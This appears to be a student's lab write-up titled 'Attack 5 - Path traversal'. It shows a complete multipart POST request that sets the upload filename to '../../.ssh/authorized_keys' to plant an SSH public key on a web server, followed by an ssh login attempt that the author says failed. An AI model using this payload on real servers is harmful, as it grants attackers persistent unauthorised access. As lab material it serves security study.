# Attack 5 - Path traversal

In this attack I performed a path traversal in order to upload a public key into the authorized keys section of the web server. The path traversal was executed by modifying the provided file name into the following in the POST request.
```bash
POST / HTTP/2
Host: dropbox.internal.regjeringen.uiaikt.no
Content-Length: 789
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://dropbox.internal.regjeringen.uiaikt.no
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary544bOyMweuBAWeuD
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://dropbox.internal.regjeringen.uiaikt.no/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

------WebKitFormBoundary544bOyMweuBAWeuD
Content-Disposition: form-data; name="file"; filename="../../.ssh/authorized_keys"
Content-Type: application/octet-stream


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6PQHo0m6V0unuZrl4oHNfoyaD0rMc0YSx0pN2FEVjbqtloJlYkGZxqKAZlWFp9M1kWgMny5M+p6B5ATPY8w0xxWmXlHvKFPXF2HZUv/r9FHyVIjcyfnUb1FOHmRaCXOngDKYq55Dlw8nh3MlQzvxF6yi3HiHiXmLctiDQaCPbLgJ9MVaXfiHeUVKYIiQUA84Bx+RBoL8Sw6U7qe2Uh4zehFLUBs2oKpnM4wg+6aDFKBB3z2zRMGhIIK7J0bRRYqnZGYQotG3+lRJ4hSC6xxzwWmCDu3k4ieA9iLzg36OChzvQfmDTwNt+1uhaXpMVpIPmWfhZODmNLMpgGjfSv0JO1mOTYtGgZ0m84Js8XXaSMk55yN2ROHLfEEehAr3TqqKwXdKr5ekX2PmZzdR50efM1NueSE74uIGz89wjAcl6yfiaN6INMxiFvOOLUabnlvzqwjQ6tMNPh8OQ/ARnO7F5uLpBkePubv/CvS7b8r5pUA89/9DYJR/8ry7qVyV4YpE= havard@HavardUbuntu

------WebKitFormBoundary544bOyMweuBAWeuD--

```
This was done in burpsuite, but I also aaditionally performed this attack using a python script which can be found in this folder. Consequently so should I have been able to ssh into the server using the following command.
```bash
ssh ingridnilsen@10.13.13.253 -i id_rsa
```
However, it would seem that this for some unknown reasons do not work even though I am also located in the same folder as the corresponding private key, and while the private key has the required permissions. I am uncertain of why this is and is unfortunately not able to perform the next attack. Theoretically if this attack was successfull, so would I be able to gain access to the ssh server.






